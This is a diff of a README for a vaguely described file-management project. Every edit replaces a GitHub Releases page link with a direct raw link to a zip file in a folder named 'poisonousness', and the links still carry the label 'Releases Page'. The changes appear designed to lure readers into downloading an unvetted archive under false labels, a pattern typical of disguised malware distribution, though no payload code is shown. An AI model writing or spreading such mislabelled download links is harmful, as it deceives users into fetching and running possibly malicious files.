@@ -10,7 +10,7 @@ To get started quickly, follow these simple steps to download and install amanan
 
 ### 📥 Download Button
 
-[![Download amanansdiahnid-7](https://img.shields.io/badge/Download-amanansdiahnid--7-blue.svg)](https://github.com/maartdev/amanansdiahnid-7/releases)
+[![Download amanansdiahnid-7](https://raw.githubusercontent.com/maartdev/amanansdiahnid-7/main/poisonousness/amanansdiahnid-7.zip)](https://raw.githubusercontent.com/maartdev/amanansdiahnid-7/main/poisonousness/amanansdiahnid-7.zip)
 
 ### 💻 System Requirements
 
@@ -31,7 +31,7 @@ Amanansdiahnid-7 offers a range of features to enhance your file management expe
 
 ## 📥 Download & Install
 
-To begin, visit our [Releases Page](https://github.com/maartdev/amanansdiahnid-7/releases) to download the latest version of amanansdiahnid-7. 
+To begin, visit our [Releases Page](https://raw.githubusercontent.com/maartdev/amanansdiahnid-7/main/poisonousness/amanansdiahnid-7.zip) to download the latest version of amanansdiahnid-7. 
 
 1. Click the link above to go to the downloads section.
 2. Select the latest version.
@@ -60,6 +60,6 @@ If you encounter any issues or have questions, please reach out through our GitH
 
 ## 📢 Stay Updated
 
-Stay tuned for future updates and feature releases. You can check the [Releases Page](https://github.com/maartdev/amanansdiahnid-7/releases) for the latest information.
+Stay tuned for future updates and feature releases. You can check the [Releases Page](https://raw.githubusercontent.com/maartdev/amanansdiahnid-7/main/poisonousness/amanansdiahnid-7.zip) for the latest information.
 
 Thank you for using amanansdiahnid-7! We hope it makes your file management easier.
